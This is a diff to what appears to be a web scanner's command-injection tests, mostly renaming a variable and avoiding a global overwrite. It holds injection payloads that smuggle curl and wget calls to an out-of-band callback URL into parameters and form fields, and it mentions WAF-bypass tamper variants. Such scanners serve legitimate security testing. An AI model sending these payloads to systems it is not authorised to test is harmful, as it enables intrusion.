@@ -73,8 +73,8 @@ def _test_cmdi_param(param, params, parsed, delay):
         all_payloads = list(CMDI_PAYLOADS)
 
     if Config.OOB_CLIENT and Config.OOB_CLIENT.ready:
-        url = Config.OOB_CLIENT.generate_payload("cmdi", param)
-        all_payloads.extend([f"; curl '{url}' ;", f"| wget -qO- '{url}' |"])
+        oob_url = Config.OOB_CLIENT.generate_payload("cmdi", param)
+        all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
 
     for payload in all_payloads:
         if "sleep" in payload.lower():
@@ -120,8 +120,8 @@ def _test_cmdi_form_input(inp, inputs, hidden_data, method, target, delay):
         all_payloads = list(CMDI_PAYLOADS)
 
     if Config.OOB_CLIENT and Config.OOB_CLIENT.ready:
-        url = Config.OOB_CLIENT.generate_payload("cmdi", inp)
-        all_payloads.extend([f"; curl '{url}' ;", f"| wget -qO- '{url}' |"])
+        oob_url = Config.OOB_CLIENT.generate_payload("cmdi", inp)
+        all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
 
     for payload in all_payloads:
         if "sleep" in payload.lower():
@@ -304,12 +304,12 @@ def scan_cmdi(url, forms, delay, threads=None):
 
     # Apply tamper chain for WAF bypass variants
     chain = get_tamper_chain()
+    payloads = list(CMDI_PAYLOADS)
     if chain.active:
-        global CMDI_PAYLOADS
-        CMDI_PAYLOADS = chain.apply_list(list(CMDI_PAYLOADS))
+        payloads = chain.apply_list(payloads)
 
     log_info(
-        f"Testing Command Injection with {len(CMDI_PAYLOADS)} payloads ({threads} threads)..."
+        f"Testing Command Injection with {len(payloads)} payloads ({threads} threads)..."
     )
     vulns = []
 
